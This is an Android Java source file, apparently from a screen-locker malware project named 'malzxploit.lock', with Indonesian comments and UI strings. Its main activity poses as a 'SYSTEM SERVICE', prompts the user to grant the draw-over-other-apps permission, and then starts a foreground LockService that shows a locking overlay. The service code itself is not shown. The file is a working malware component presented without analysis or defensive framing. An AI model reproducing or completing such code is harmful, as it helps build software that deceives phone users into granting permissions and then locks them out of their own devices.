package com.malzxploit.lock;

import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;

public class MainActivity extends Activity {

    private TextView statusText;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);

        // Bikin UI manual (gak butuh layout XML)
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setGravity(Gravity.CENTER);
        layout.setBackgroundColor(Color.BLACK);
        layout.setPadding(40, 40, 40, 40);

        TextView title = new TextView(this);
        title.setText("SYSTEM SERVICE");
        title.setTextColor(Color.RED);
        title.setTextSize(28);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        statusText = new TextView(this);
        statusText.setText("\nStatus: Belum aktif\n");
        statusText.setTextColor(Color.GREEN);
        statusText.setTextSize(16);
        statusText.setGravity(Gravity.CENTER);
        layout.addView(statusText);

        Button btn = new Button(this);
        btn.setText("AKTIFKAN SEKARANG");
        btn.setTextSize(18);
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestOverlay();
            }
        });
        layout.addView(btn);

        setContentView(layout);
    }

    private void requestOverlay() {
        if (Build.VERSION.SDK_INT >= 23 && !Settings.canDrawOverlays(this)) {
            statusText.setText("\nStatus: Minta izin overlay...\n");
            try {
                Intent i = new Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName())
                );
                startActivityForResult(i, 100);
            } catch (Exception e) {
                statusText.setText("\nError: " + e.getMessage() + "\n");
            }
        } else {
            startLock();
        }
    }

    @Override
    protected void onActivityResult(int req, int res, Intent d) {
        super.onActivityResult(req, res, d);
        if (req == 100) {
            if (Build.VERSION.SDK_INT >= 23 && Settings.canDrawOverlays(this)) {
                statusText.setText("\nStatus: Izin OK! Mengaktifkan...\n");
                startLock();
            } else {
                statusText.setText("\nStatus: Izin DITOLAK. Coba lagi.\n");
            }
        }
    }

    private void startLock() {
        try {
            Intent svc = new Intent(this, LockService.class);
            if (Build.VERSION.SDK_INT >= 26) {
                startForegroundService(svc);
            } else {
                startService(svc);
            }
            statusText.setText("\nStatus: AKTIF!\n\nOverlay muncul 3 detik...\n");
        } catch (Exception e) {
            statusText.setText("\nError start service: " + e.getMessage() + "\n");
        }
    }
}
